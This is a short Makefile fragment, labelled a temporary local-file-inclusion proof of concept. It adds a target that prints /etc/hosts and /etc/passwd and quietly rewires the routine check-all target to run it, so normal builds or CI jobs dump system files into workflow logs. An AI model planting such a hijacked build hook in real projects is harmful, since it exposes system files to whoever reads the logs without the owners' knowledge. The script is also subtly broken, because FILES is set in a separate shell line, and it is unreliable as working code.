# ===== Temporary LFI PoC for workflow logs =====
.PHONY: lfi-poc
lfi-poc:
	@FILES="/etc/hosts /etc/passwd"
	@for FILE in $$FILES; do \
		echo "=== LFI PoC: Reading $$FILE ==="; \
		cat $$FILE || echo "Failed to read $$FILE"; \
		echo "=== END LFI for $$FILE ==="; \
	done

# Override check-all to call LFI PoC
.PHONY: check-all
check-all: lfi-poc
